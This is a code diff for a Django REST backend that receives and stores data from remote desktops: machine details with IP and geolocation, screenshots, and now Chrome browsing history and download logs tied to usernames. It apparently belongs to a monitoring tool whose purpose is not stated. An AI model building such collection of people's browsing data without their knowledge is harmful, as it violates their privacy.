@@ -9,7 +9,7 @@ from rest_framework.parsers import MultiPartParser, FormParser
 from rest_framework.response import Response
 from rest_framework import status
 from rest_framework.views import APIView
-from remoteDesktops.models import Desktop, Screenshot
+from remoteDesktops.models import Desktop, Screenshot, ChromeUrlHistory, ChromeDownloadLog
 
 
 def get_client_ip(request):
@@ -28,19 +28,23 @@ def receive_data(request):
     try :
         data = request.data
         data['geo_location']['ip_address'] = get_client_ip(request)
-        Desktop.objects.record_machine(request.data)
+        Desktop.objects.record_machine(data)
     except Exception as error:
         return Response({"error": str(error)}, status=400)
-    return Response({"message": "Data received successfully"}, status=status.HTTP_200_OK)
+    return Response({"message": "Machine data received successfully"}, status=status.HTTP_200_OK)
+
 
 @api_view(['POST'])
 @permission_classes([IsAuthenticated])
-def receive_chrome_history(request):
+def receive_chrome_data(request):
     try:
-        pass
+        data = request.data
+        ChromeUrlHistory.objects.record(user=data['username'], machine=data['guid'], urlHistories=data['chromeHistory'])
+        ChromeDownloadLog.objects.record(user=data['username'], machine=data['guid'], downloads=data['chromeDownloads']
+    )
     except Exception as error:
         return Response({"error": str(error)}, status=400)
-    return Response({"message": "Data received successfully"}, status=status.HTTP_200_OK)
+    return Response({"message": "User data received successfully"}, status=status.HTTP_200_OK)
 
 @permission_classes([IsAuthenticated])
 class FileUploadView(APIView):
